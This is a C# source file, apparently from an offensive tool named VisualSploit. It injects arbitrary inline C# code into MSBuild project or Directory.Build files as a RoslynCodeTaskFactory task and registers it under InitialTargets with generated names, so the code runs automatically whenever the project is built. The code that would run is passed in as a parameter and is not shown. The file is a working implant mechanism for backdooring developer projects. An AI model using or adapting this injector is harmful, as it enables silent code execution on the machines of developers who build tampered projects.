using System.Xml;
using System.Xml.Linq;

namespace VisualSploit;

internal static class MSBuild
{
    public static void Inject(string inlineCode, Config cfg, Naming naming)
    {
        var taskName = naming.Next();
        var targetName = naming.Next();

        var outputPath = cfg.OutputPath ?? cfg.TargetPath;

        var (doc, root) = LoadOrCreate(cfg.TargetPath);

        if (root.Elements().Any(e =>
            e.Name.LocalName == "UsingTask" &&
            e.Attribute("TaskFactory")?.Value == "RoslynCodeTaskFactory"))
            throw new InvalidOperationException(
                $"Target already contains a RoslynCodeTaskFactory task: {cfg.TargetPath}");

        if (!cfg.NoBackup && File.Exists(outputPath))
            File.Copy(outputPath, $"{outputPath}.bak", overwrite: true);

        MergeInitialTarget(root, targetName);

        var payload = WrapTask(inlineCode, taskName, targetName);
        // XDocument requires a single root; wrap and unpack to inject the two siblings.
        foreach (var element in XElement.Parse($"<Root>{payload}</Root>").Elements())
        {
            foreach (var e in element.DescendantsAndSelf())
                e.Name = root.Name.Namespace + e.Name.LocalName;
            root.Add(element);
        }

        SaveDocument(doc, outputPath);
    }

    static (XDocument Doc, XElement Root) LoadOrCreate(string targetPath)
    {
        if (File.Exists(targetPath))
        {
            var doc = XDocument.Load(targetPath);
            var root = doc.Root ?? throw new InvalidOperationException($"Invalid project file: {targetPath}");
            return (doc, root);
        }

        if (!IsDirectoryBuildFile(Path.GetFileName(targetPath)))
            throw new FileNotFoundException($"Target file not found: {targetPath}");

        var newRoot = new XElement("Project");
        return (new XDocument(newRoot), newRoot);
    }

    static bool IsDirectoryBuildFile(string filename) =>
        filename.Equals("Directory.Build.props", StringComparison.OrdinalIgnoreCase) ||
        filename.Equals("Directory.Build.targets", StringComparison.OrdinalIgnoreCase);

    static void MergeInitialTarget(XElement root, string targetName)
    {
        var existing = root.Attribute("InitialTargets")?.Value ?? "";
        var targets = existing
            .Split(';', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
            .ToList();
        if (!targets.Contains(targetName, StringComparer.OrdinalIgnoreCase))
            targets.Add(targetName);
        root.SetAttributeValue("InitialTargets", string.Join(";", targets));
    }

    static void SaveDocument(XDocument doc, string outputPath)
    {
        var dir = Path.GetDirectoryName(outputPath);
        if (!string.IsNullOrEmpty(dir))
            Directory.CreateDirectory(dir);

        var settings = new XmlWriterSettings
        {
            Indent = true,
            IndentChars = "  ",
            OmitXmlDeclaration = doc.Declaration == null,
            Encoding = new System.Text.UTF8Encoding(encoderShouldEmitUTF8Identifier: false)
        };

        using var writer = XmlWriter.Create(outputPath, settings);
        doc.Save(writer);
    }

    static string WrapTask(string inlineCode, string taskName, string targetName) =>
        $$"""
        <UsingTask TaskName="{{taskName}}" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
          <Task>
            <Code Type="Method" Language="cs">
            <![CDATA[
        {{inlineCode}}
            ]]>
            </Code>
          </Task>
        </UsingTask>
        <Target Name="{{targetName}}">
          <{{taskName}}/>
        </Target>
        """;

}
